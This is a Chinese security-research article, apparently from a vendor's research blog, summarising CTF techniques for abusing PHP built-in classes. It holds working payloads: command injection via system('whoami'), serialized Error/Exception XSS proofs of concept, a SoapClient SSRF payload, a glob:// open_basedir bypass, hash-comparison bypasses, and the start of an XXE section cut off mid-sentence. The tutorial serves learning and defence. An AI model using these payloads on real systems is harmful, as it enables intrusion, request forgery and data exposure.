---
title: PHP原生类在安全方面的利用总结
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247499359&idx=1&sn=91d04da37507b552d68e2b00de982253&chksm=fa522be1cd25a2f7738595f7cbda638b548aa3535c58f739f690175968ef76105987a03c5da7&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2023-01-04
fetch_date: 2025-10-04T03:00:20.120748
---

# PHP原生类在安全方面的利用总结

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQOj9pjecAWm080jfIOSKMx8B1YI6n0A6ZtfbRMxE5QZgDg18O2Y2rc8Bd6CAwcmtvYmwk98FXozg/0?wx_fmt=jpeg)

# PHP原生类在安全方面的利用总结

原创

安全技术研究院

山石网科安全技术研究院

‍

**‍0****1**

**前言‍‍‍‍**

最近打了一个比赛遇到了以new a(b)这样的考点,结合以前了解的知识,所以总结一下几种类似形式的解题技巧。

这里主要以下三种形式的代码

eval("echo new b);")

echo new b)

new b)

**02****‍**

**eval（“echo new a(b);"）‍‍‍**

首先来看第一种

这个形式的代码相对简单,我们只需要给a随便传⼀个原⽣类，给b传恶意命令即可：

```
?a=Exception&b=system('whoami')
?a=SplFileObject&b=system('whoami')
```

然后我们来看第二种,也是比赛中经常会遇到的

这里我们就需要来了解到php原生类的概念了

**03****‍**

**使用Error/Exception内置类进行XSS**

### Error 内置类

* 适用于php7版本
* 在开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()` 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 `echo <Object>` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString` 方法，这是一种挖洞的新思路。

下面演示如何使用 Error 内置类来构造 XSS。

测试代码：

```
<?php$a = unserialize($_GET['whoami']);echo $a;?>
```

（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）

给出POC：

```
<?php$a = new Error("<script>alert('xss')</script>");$b = serialize($a);echo urlencode($b);  ?>//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

### Exception 内置类

* 适用于php5、7版本
* 开启报错的情况下

测试代码：

```
<?php$a = unserialize($_GET['whoami']);echo $a;?>
```

给出POC：

```
<?php$a = new Exception("<script>alert('xss')</script>");$b = serialize($a);echo urlencode($b);  ?>//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

**04****‍**

**使用Error/Exception内置类绕过哈希比较**

在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。

### Error 类

**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。

**类摘要：**

```
Error implements Throwable {
  /* 属性 */
  protected string $message ;
  protected int $code ;
  protected string $file ;
  protected int $line ;
  /* 方法 */
  public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
  final public getMessage ( ) : string
  final public getPrevious ( ) : Throwable
  final public getCode ( ) : mixed
  final public getFile ( ) : string
  final public getLine ( ) : int
  final public getTrace ( ) : array
  final public getTraceAsString ( ) : string
  public __toString ( ) : string
  final private __clone ( ) : void
}
```

**类属性：**

* message：错误消息内容
* code：错误代码
* file：抛出错误的文件名
* line：抛出错误在该文件中的行数

**类方法：**

* `Error::__construct` — 初始化 error 对象
* `Error::getMessage` — 获取错误信息
* `Error::getPrevious` — 返回先前的 Throwable
* `Error::getCode` — 获取错误代码
* `Error::getFile` — 获取错误发生时的文件
* `Error::getLine` — 获取错误发生时的行号
* `Error::getTrace` — 获取调用栈（stack trace）
* `Error::getTraceAsString` — 获取字符串形式的调用栈（stack trace）
* `Error::__toString` — error 的字符串表达
* `Error::__clone` — 克隆 error

### Exception 类

**Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。

**类摘要：**

```
Exception {
  /* 属性 */
  protected string $message ;
  protected int $code ;
  protected string $file ;
  protected int $line ;
  /* 方法 */
  public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
  final public getMessage ( ) : string
  final public getPrevious ( ) : Throwable
  final public getCode ( ) : mixed
  final public getFile ( ) : string
  final public getLine ( ) : int
  final public getTrace ( ) : array
  final public getTraceAsString ( ) : string
  public __toString ( ) : string
  final private __clone ( ) : void
}
```

**类属性：**

* message：异常消息内容
* code：异常代码
* file：抛出异常的文件名
* line：抛出异常在该文件中的行号

**类方法：**

* `Exception::__construct` — 异常构造函数
* `Exception::getMessage` — 获取异常消息内容
* `Exception::getPrevious` — 返回异常链中的前一个异常
* `Exception::getCode` — 获取异常代码
* `Exception::getFile` — 创建异常时的程序文件名称
* `Exception::getLine` — 获取创建的异常所在文件中的行号
* `Exception::getTrace` — 获取异常追踪信息
* `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息
* `Exception::__toString` — 将异常对象转换为字符串
* `Exception::__clone` — 异常克隆

我们可以看到，在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。

我们以Error为例，我们看看当触发他的 `__toString` 方法时会发生什么：

```
<?php
$a = new Error("payload",1);
echo $a;
```

输出如下：

```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

发现这将会以字符串的形式输出当前报错，包含当前的错误信息（"payload"）以及当前报错的行号（"2"），而传入 `Error("payload",1)` 中的错误代码“1”则没有输出出来。

在来看看下一个例子：

```
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```

输出如下：

```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 `__toString` 返回的数据包含当前行号。

Exception 类与 Error 的使用和结果完全一样，只不过 `Exception` 类适用于PHP 5和7，而 `Error` 只适用于 PHP 7。

**05****‍**

**使用SoapClient类进行SSRF‍‍‍‍**

### SoapClient 类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

类摘要如下：

```
SoapClient {  /* 方法 */  public __construct ( string|null $wsdl , array $options = [] )  public __call ( string $name , array $args ) : mixed  public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null  public __getCookies ( ) : array  public __getFunctions ( ) : array|null  public __getLastRequest ( ) : string|null  public __getLastRequestHeaders ( ) : string|null  public __getLastResponse ( ) : string|null  public __getLastResponseHeaders ( ) : string|null  public __getTypes ( ) : array|null  public __setCookie ( string $name , string|null $value = null ) : void  public __setLocation ( string $location = "" ) : string|null  public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool  public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed}
```

可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。

该类的构造函数如下：

```
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```

* 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
* 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

### 使用 SoapClient 类进行 SSRF

知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target\_url。

```
<?php$a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));$b = serialize($a);echo $b;$c = unserialize($b);$c->a();   // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?>
```

但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。

## 使用 DirectoryIterator 类绕过 open\_basedir

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。

DirectoryIterator与glob://协议结合将无视open\_basedir对目录的限制，可以用来列举出指定目录下的文件。

测试代码：

```
// test.php<?php$dir = $_GET['whoami'];$a = new DirectoryIterator($dir);foreach($a as $f){  echo($f->__toString().'<br>');}?># payload一句话的形式:$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

我们输入 `/?whoami=glob:///*` 即可列出根目录下的文件,但是会发现只能列根目录和open\_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

**06****‍**

**使用SimpleXMLElement类进行XXE‍‍‍‍**

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

### SimpleXMLElement

通过设置第三个参数 data\_is\_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数 data 就是我们自己设置的payload的ur...